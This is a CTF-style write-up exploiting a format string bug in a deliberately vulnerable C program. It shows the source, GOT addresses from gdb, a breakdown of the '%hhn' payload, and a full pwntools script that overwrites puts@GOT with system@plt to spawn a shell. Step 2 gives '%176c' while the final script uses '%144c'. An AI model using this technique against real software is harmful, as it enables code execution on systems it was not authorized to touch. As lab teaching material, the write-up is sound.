# Simple PWN - 0x11(format string bug)
###### tags: `CTF` `PWN` `eductf`


## format string bug background
[printf %n](https://www.geeksforgeeks.org/g-fact-31/)
![](https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg)

## Original Code
```cpp!=
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char fmt[0x20];

    system("echo 'Give me fmt: '");
    read(0, fmt, 0x20);
    printf(fmt);

    system("echo 'Give me string: '");
    read(0, fmt, 0x20);
    puts(fmt);

    return 0;
}
```
```bash!
$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
```
* In this problem, we can consider to use `format string bug` to achieve `GOT hijacking` without buffer overflow.
* **The main idea is totally the same as [GOT hijacking lecture](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s)**
* Thus, we can observe which function can be overlapped by `system plt` → <font color="FF0000">**`puts function`**</font>
    * Because...
    `puts` just needs one argument like `system` function, but how about `printf`?
    Unfortunately, it appeared before 2nd read function, because 2nd `read` needs to store the argument for `system` function such as `sh\x00`.
## Exploit - GOT hijacking + format string bug
**Our goal is hijack `puts GOT` to `system plt`**
1. Find `puts GOT` address and `system plt` → <font color="FF0000">`0x403318` and `0x401090`</font>
    ```bash
    $ objdump -d fmt
    ...
    0000000000401090 <system@plt>:
      401090:       f3 0f 1e fa             endbr64
      401094:       f2 ff 25 85 22 00 00    bnd jmp *0x2285(%rip) # 403320 <system@GLIBC_2.2.5>
      40109b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
    ...
    $ gdb fmt
    ...
    pwndbg> attach <PID>
    pwndbg> got

    GOT protection: No RELRO | GOT functions: 5

    [0x403318] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
    [0x403320] system@GLIBC_2.2.5 -> 0x7f87de291d60 (system) ◂— endbr64
    [0x403328] printf@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
    [0x403330] read@GLIBC_2.2.5 -> 0x7f87de355980 (read) ◂— endbr64
    [0x403338] setvbuf@GLIBC_2.2.5 -> 0x7f87de2c2670 (setvbuf) ◂— endbr64
    ...
    ```
2. Construct format string - try and error
    ```python!
    r.sendafter("Give me fmt: ", b"%176c%8$hhn" + b"aaaaa" + p64(puts_got))
    ```
    **從結果來看比較清楚**
    ![](https://imgur.com/G4YPrXO.png)

    * Parse `b"%176c%8$hhn" + b"aaaaa" + p64(puts_got)`
Our goal is overlap `puts GOT`, so we put address of puts_got at final position, that is `[%rsp + 16]`(format string: `$8`)
We want to modify `0x401030` to `0x401090`, so we just modify only **1 bytes**(format string: `%hhn`). In addition, <font color="FF0000">`0x90` is 144</font> as decimal.(format string: `%176c`)
Combine all format sting: `%176c%8$hhn` and other space can pad trash bytes

3. Pass the command to `system` function - `sh\x00` to open shell
    ```python!
    r.sendafter("Give me string: ", "sh\x00")
    ```
4. Finally, we got shell!!!
    ![](https://imgur.com/Zh5jE4N.png)
    
* Whole exploit
    ```python!
    from pwn import *

    context.arch = 'amd64'

    r = process("./fmt")
    raw_input()

    puts_got = 0x403318
    system_plt = 0x401090

    r.sendafter("Give me fmt: ", b"%144c%8$hhn" + b"aaaaa" + p64(puts_got))
    r.sendafter("Give me string: ", "sh\x00")

    r.interactive()
    ```